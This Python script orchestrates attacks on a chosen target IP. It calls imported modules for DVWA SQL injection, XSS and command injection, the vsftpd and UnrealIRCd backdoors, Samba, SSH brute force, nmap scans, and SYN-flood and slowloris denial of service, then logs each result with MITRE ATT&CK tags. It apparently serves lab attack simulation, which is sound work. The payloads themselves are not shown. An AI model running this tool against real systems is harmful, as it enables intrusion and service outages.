#!/usr/bin/python3

import sys
import time
import os

# installed packages
from pwn import *
import argparse
import netifaces
import csv

# declare script path
sys.path.append(os.path.join(os.path.dirname(__file__), 'script'))
from datetime import datetime

# custom prerequisite
from script import pre_settings
from script import pre_ping_check
from script import pre_services_check
from script import pre_attacks
from script import pre_services_restart
from script import pre_web_dvwa

# import exploit
from script import exploit_web_dvwa_sqli
from script import exploit_web_dvwa_xss
from script import exploit_web_dvwa_os
from script import exploit_server_samba
from script import exploit_server_ssh_bruteforce
from script import exploit_server_unrealircd
from script import exploit_server_vsftpd
from script import exploit_network_dos_slowloris
from script import exploit_network_dos_syn
from script import exploit_network_enum_nmap

# displays only critical errors or important information
context.log_level = pre_settings.debug_critical

def log_attack(writer, siteid, lhost, rhost, date, iteration, attacks):
    writer.writerow({
        'Site ID': siteid,
        'Attacker IP': lhost,
        'Target IP': rhost,
        'Date': date,
        'Iteration': iteration,
        'Attack': attacks['attack'],
        'MITRE ATT&CK': attacks['mitre'],
        'CWE': attacks['cwe'],
        'Port': attacks['port'],
        'Service': attacks['service'],
        'Type': attacks['type'],
        'Status (Ping)': attacks['status (ping)'],
        'Status (Service)': attacks['status (service)'],
        'Status (Attack)': attacks['status (attack)'],
        'Remark': attacks['remark']
    })

def main():
    try:
        parser = argparse.ArgumentParser(description=pre_settings.print_argparse_desc('Main Script'), epilog=f'{pre_settings.print_argparse_epilog(f"python3 {sys.argv[0]} --rhost 10.251.5.5 --lhost 10.251.5.4 --siteid 506040 --iteration 3 --thread 5")}')
        parser.add_argument('--rhost', help='IP Address (Target)', required=True)
        parser.add_argument('--lhost', help='IP Address (Attacker)', required=True, default=(netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr'] if 'eth0' in netifaces.interfaces() else '127.0.0.1'))
        parser.add_argument('--siteid', help='Site ID', required=True)
        parser.add_argument('--iteration', help='Number of iteration', default=3, type=int)
        parser.add_argument('--thread', help='Number of SSH bruteforce thread', default=5, type=int)
        args = parser.parse_args()

        rhost = args.rhost
        lhost = args.lhost
        siteid = args.siteid
        iterations = args.iteration
        thread = args.thread

        # create folder based on siteid
        path = f'output/{siteid}'
        os.makedirs(path, exist_ok=True)

        # create CSV
        filename = f'{path}/{lhost}_attack_{rhost}_{int(time.time())}.csv'
        with open(filename, mode='w', newline='') as csvfile:
            fieldnames = ['Site ID', 'Attacker IP', 'Target IP', 'Date', 'Iteration', 'Attack', 'MITRE ATT&CK', 'CWE', 'Port', 'Service', 'Type', 'Status (Ping)', 'Status (Service)', 'Status (Attack)', 'Remark']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()

            for iteration in range(1, iterations + 1):
                # banner
                print(pre_settings.print_iteration_time(iteration, datetime.now()))

                # web attack
                log_attack(writer, siteid, lhost, rhost, datetime.now(), iteration, exploit_web_dvwa_sqli.exploit(rhost, pre_attacks.HTTP_PORT, pre_attacks.attacks.get('sqli')))
                log_attack(writer, siteid, lhost, rhost, datetime.now(), iteration, exploit_web_dvwa_xss.exploit(rhost, pre_attacks.HTTP_PORT, pre_attacks.attacks.get('xss')))
                log_attack(writer, siteid, lhost, rhost, datetime.now(), iteration, exploit_web_dvwa_os.exploit(rhost, pre_attacks.HTTP_PORT, pre_attacks.attacks.get('os')))

                # server
                log_attack(writer, siteid, lhost, rhost, datetime.now(), iteration, exploit_server_vsftpd.exploit(rhost, pre_attacks.FTP_PORT, pre_attacks.attacks.get('vsftpd')))
                log_attack(writer, siteid, lhost, rhost, datetime.now(), iteration, exploit_server_unrealircd.exploit(rhost, pre_attacks.IRC_PORT, pre_attacks.attacks.get('unrealircd')))
                log_attack(writer, siteid, lhost, rhost, datetime.now(), iteration, exploit_server_samba.exploit(rhost, pre_attacks.SAMBA_PORT, pre_attacks.attacks.get('samba')))
                log_attack(writer, siteid, lhost, rhost, datetime.now(), iteration, exploit_server_ssh_bruteforce.exploit(rhost, pre_attacks.SSH_PORT, pre_attacks.attacks.get('bruteforce_ssh'), thread))

                # network
                log_attack(writer, siteid, lhost, rhost, datetime.now(), iteration, exploit_network_enum_nmap.exploit(rhost, pre_attacks.SSH_PORT, pre_attacks.attacks.get('nmap_ssh')))
                log_attack(writer, siteid, lhost, rhost, datetime.now(), iteration, exploit_network_enum_nmap.exploit(rhost, pre_attacks.SAMBA_PORT, pre_attacks.attacks.get('nmap_samba')))
                log_attack(writer, siteid, lhost, rhost, datetime.now(), iteration, exploit_network_dos_syn.exploit(rhost, pre_attacks.HTTP_PORT, pre_attacks.attacks.get('dos_syn'), 1, 1))
                log_attack(writer, siteid, lhost, rhost, datetime.now(), iteration, exploit_network_dos_slowloris.exploit(rhost, pre_attacks.HTTP_PORT, pre_attacks.attacks.get('dos_slowloris'), num_sockets=200, sleep_buffer=20))

        print(pre_settings.print_csv_time(filename, datetime.now()))

    except (OSError, Exception) as e:
        log.error(str(e))
    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == '__main__':
    main()